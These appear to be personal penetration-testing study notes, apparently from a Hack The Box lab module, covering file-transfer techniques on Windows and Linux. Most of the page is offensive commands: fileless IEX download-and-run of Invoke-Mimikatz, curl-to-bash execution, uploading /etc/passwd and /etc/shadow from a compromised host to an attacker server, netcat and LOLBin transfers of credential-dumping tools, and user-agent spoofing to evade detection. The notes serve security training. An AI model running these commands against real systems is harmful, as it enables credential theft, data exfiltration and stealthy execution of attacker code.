# Windows Opretions

## Downloads Operations

### PowerShell Base64 Encode & Decode

```shell-session
md5sum id_rsa
```
`TO check the hash in linux`

```shell-session
cat id_rsa |base64 -w 0;echo
```
`This will convert the content of the file in base64 string`


```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("YOUR_BASE64_STRING"))
```
`THis will create the file using the base64 string `

```powershell-session
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
`This will print the md5 hash of the file which you can use to chech the file integrity`



### PowerShell Web Downloads

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |


```powershell-session
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```
`Downlloading file from web using the DownloadFile Method`


```powershell-session
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
`Downlloading file from web using the DownloadFileAsync Method`


```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
`Downloading and directly running it in the memeory`


```powershell-session
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
`Using Invoke-WebRequest to download the file and save it to an particular location`


```powershell-session
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
`This command to use When Faced with Internet Explorer engine is not available error`

```powershell-session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
`IF you see error realted to SSL/TLS secure channel then use this`


### SMB Downloads


```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
`Create an smb server using smbserver.py`

```cmd-session
copy \\192.168.220.133\share\nc.exe
```
`This will copy the nc.exe from the smbserver`


```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
`Create the SMB Server with a Username and Password`


```cmd-session
net use n: \\192.168.220.133\share /user:test test
```
`Downloding file form smbserver by providing username and password`


### FTP Downloads


```shell-session
sudo pip3 install pyftpdlib
```
`#### Installing the FTP Server Python3 Module - pyftpdlib`


```shell-session
python3 -m pyftpdlib --port 21
```
`#### Setting up a Python3 FTP Server`


```powershell-session
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
`Using pwershell to downlaod the file from ftp`


```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
`#### Create a Command File for the FTP Client and Download the Target File`


## Upload Operations

### PowerShell Base64 Encode & Decode

```powershell-session
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
`This will print the content of hosts file in base64 string`


```shell-session
echo YOUR_BASE64_STRING | base64 -d > hosts
```
`This will convert the base64 back to readable text and store it in the hosts file`

---

### PowerShell Web Uploads

```shell-session
pip3 install uploadserver
```
`Installing the upload server`

```shell-session
python3 -m uploadserver
```
`Starng the upload server`
	

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
`#### PowerShell Script to Upload a File to Python Upload Server`


```powershell-session
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
```powershell-session
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
`This will POST the base64 string of the file to the netcat which is listing on the 8000`

```shell-session
echo <base64> | base64 -d -w 0 > hosts
```
`Conver the base64 string to an file`


### SMB Uploads


#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.

```shell-session
sudo pip3 install wsgidav cheroot
```
`#### Installing WebDav Python modules`


```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
`Starting your smb server to revecive the file from the target machine Using the WebDav Python module`


```cmd-session
dir \\192.168.49.128\DavWWWRoot
```
`Checking the connectionn using this`

```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
` Uploading Files using SMB from the target machine to your attck machine`


### FTP Uploads

```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```
`Starting our ftp server with write premissions`


```powershell-session
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
`Using the above to upload file to our attcking machhine`


```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
` Create a Command File for the FTP Client to Upload a File`




# Linux File Transfer Methods

## Download Operations

### Base64 Encoding / Decoding

```shell-session
md5sum id_rsa
```
`TO check the hash`

```shell-session
 cat id_rsa |base64 -w 0;echo
```
`This will print the base64 strings of the filw you want to transfer`


```shell-session
echo -n 'YOUR_BASE64_STRING' | base64 -d > id_rsa
```
`We copy this content, paste it onto our Linux target machine, and use base64 with the option -d to decode it.`


### Web Downloads with Wget and cURL


```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
`#### Download a File Using wget into the target machine`

```shell-session
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
`#### Download a File Using cURL`


```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
`Fileless Download with wget Directly running in the memory`

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
`Fileless Download with cURL Direclty running it in the memeory`


### Download with Bash (/dev/tcp)


```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```
`#### Connect to the Target Webserver`


```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
`#### HTTP GET Request`


```shell-session
cat <&3
```
`#### Print the Response`


### SSH Downloads

```shell-session
sudo systemctl enable ssh
```
`#### Enabling the SSH Server`

```shell-session
sudo systemctl start ssh
```
`#### Starting the SSH Server`

```shell-session
scp plaintext@192.168.49.128:/root/myroot.txt . 
```
`#### Linux - Downloading Files Using SCP`


## Upload Operations

### Web Upload

```shell-session
sudo python3 -m pip install --user uploadserver
```
`Download Uploadserver`


```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
`Create a Self-Signed Certificate`


```shell-session
mkdir https && cd https
```
```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
`Starting the webserver`


```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
`from our compromised machine, let's upload the /etc/passwd and /etc/shadow files`


```shell-session
python3 -m http.server
```
`Creating a Web Server with Python3`


```shell-session
python2.7 -m SimpleHTTPServer
```
`Creating a Web Server with Python2.7`

```shell-session
php -S 0.0.0.0:8000
```
`Creating a Web Server with PHP`


```shell-session
ruby -run -ehttpd . -p8000
```
`Creating a Web Server with Ruby`


```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```
`Download the File from the Target Machine onto the Pwnbox`


### SCP Upload

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
`File Upload using SCP`



# Transferring Files with Code

## Python

```shell-session
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
` Python 2 - Download`

```shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
`Python 3 - Download`

## PHP

```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
`PHP Download with File_get_contents()`

```shell-session
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
`PHP Download with Fopen()`

```shell-session
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
`PHP Download a File and Pipe it to Bash`

## Other Languages

```shell-session
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
`Perl - Download a File`


```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
`Ruby - Download a File`


## JavaScript

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
`We will create an wget.js`


```cmd-session
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
`We will use the wget.js and cscript  to download the file`


## VBScript

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
`We will create an wget.vbs script`

```cmd-session
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
`We will the cscript to execyte the vbs script to downlaod the file`


## Upload Operations using Python3


```shell-session
python3 -m uploadserver 
```
`Starting the Python uploadserver Module`

```shell-session
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
`Uploading a File Using a Python One-liner`



# Miscellaneous File Transfer Methods

## File Transfer with Netcat and Ncat

Ncat is the mordern version of nc

```shell-session
nc -l -p 8000 > SharpKatz.exe
```
` NetCat - Compromised Machine - Listening on Port 8000`

```shell-session
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
`Ncat - Compromised Machine - Listening on Port 8000`


```shell-session
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```shell-session
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
`Netcat - Attack Host - Sending File to Compromised machine`


```shell-session
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
`Ncat - Attack Host - Sending File to Compromised machine`


```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
`NetCat - Sending File as Input to Netcat`

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
`Ncat - Sending File as Input to Ncat`


---

## PowerShell Session File Transfer

You need to have administrative rights to do this and you have t be an memeber of Remote Management users

enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

```powershell-session
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
`to Confirm WinRM port TCP 5985 is Open on DATABASE01.`


```powershell-session
$Session = New-PSSession -ComputerName DATABASE01
```
`Create a PowerShell Remoting Session to DATABASE01`

```powershell-session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
`Copy samplefile.txt from our Localhost to the DATABASE01 Session`


```powershell-session
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
`Copy DATABASE.txt from DATABASE01 Session to our Localhost`


## RDP

```shell-session
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
`This command will allow you to share any folder form your linux machine to you target windows machine using rdesktop`

```shell-session
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
`This command will allow you to share any folder form your linux machine to you target windows machine using xfreerdp`


![Pasted image 20251017213129](../../attchments/Pasted%20image%2020251017213129.png)

if you can't see anything in the network section then use e mstsc.exe to all this drives acces


# Protected File Transfers

IN this we will transfer file in encrypted way to avoid data leaks

## File Encryption on Windows

`after running the Invoke-AESEncryption.ps1`

```powershell-session
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
```

`Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.`

```
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
```

`Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.`


``` 

Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
```

`Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"`
 
```
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
```

`Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"`


```powershell-session
Import-Module .\Invoke-AESEncryption.ps1
```
`Import Module Invoke-AESEncryption.ps1`


```powershell-session
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
`Example for the encryption this will give scan-results.txt.ase`


## File Encryption on Linux


```shell-session
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```
`Encrypting /etc/passwd with openssl`


```shell-session
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd 
```
`Decrypt passwd.enc with openssl`


# Catching Files over HTTP/S

```
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
`<Creates the nested upload directory structure>`


```
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
`<Recursively changes the owner and group of the upload directory to www-data>`


```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```
`<Creates a symbolic link to enable the new Nginx site configuration>`


```
sudo systemctl restart nginx.service
```
`<Restarts the Nginx service to apply the new configuration>`


```
tail -2 /var/log/nginx/error.log
```
`<Displays the last two lines of the Nginx error log to check for errors>`


```
ss -lnpt | grep 80
```
`<Lists all listening ports and filters for port 80 to find a conflict>`


```
ps -ef | grep 2811
```
`<Searches for the running process with PID 2811>`


```
sudo rm /etc/nginx/sites-enabled/default
```
`<Removes the default Nginx site configuration file>`


```
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
`<Uploads the /etc/passwd file to the server using an HTTP PUT request>`


```
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```
`<Displays the last line of the newly uploaded file to verify its contents>`

# Living off The Land

he term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)


Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

## LOLBAS

`GO to LOLBAS and Search /uploads`

![Pasted image 20251018080141](../../attchments/Pasted%20image%2020251018080141.png)

```cmd-session
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
`We used certreq.exe to upload the win.ini to our host machine`


```shell-session
sudo nc -lvnp 8000
```
`File recived in netcat session`


## GTFOBins


To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.



```shell-session
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
`Create Certificate in our Pwnbox`


```shell-session
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
`Stand up the Server in our Pwnbox to transfer the LinEnum file`

```shell-session
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
`Download File from the Compromised Machine`


## Other Common Living off the Land tools

```powershell-session
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
`File Download with Bitsadmin`


```powershell-session
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
`File Download with Bitsadmin using the powershell module`

```cmd-session
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
`Download a File with Certutil`


# Detection

### Command-Line Detection

- **Blacklisting:** This method, which blocks known bad commands, is simple but **easy to bypass** (e.g., by changing capitalization).
    
- **Whitelisting:** This method involves creating a list of all _approved_ commands for an environment. While **time-consuming to set up**, it is a **very robust** way to quickly detect and alert on any unusual or unauthorized commands.
    

### HTTP User Agent Detection

- **What it is:** A "user agent" is a string that identifies any client (like a web browser, script, or tool) connecting to a web server via HTTP.
    
- **Why it's used:** It's part of the standard HTTP negotiation, allowing servers to identify clients (e.g., Chrome, Firefox) and ensure content is delivered correctly.
    
- **Security Relevance:** Malicious tools (like Nmap, sqlmap), custom scripts, and file transfer techniques also have user agent strings.
    
- **Detection Strategy:** Organizations can create a **whitelist of known, legitimate user agents** used by browsers, operating system processes, and update services (like Windows Update or antivirus). This list is fed into a SIEM (Security Information and Event Management) tool to filter out normal traffic, allowing security teams to **focus on anomalies** and investigate suspicious user agent strings that could indicate malicious activity.


# Evading Detection


## Changing User Agent

We will try to emulate comman web browsers

```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```


```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
`Request with Chrome User Agent`


## LOLBAS / GTFOBins

There is an change that powershell and other things are not working for you tthe use the LOLBAS

```powershell-session
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
`Transferring File with GfxDownloadWrapper.exe`


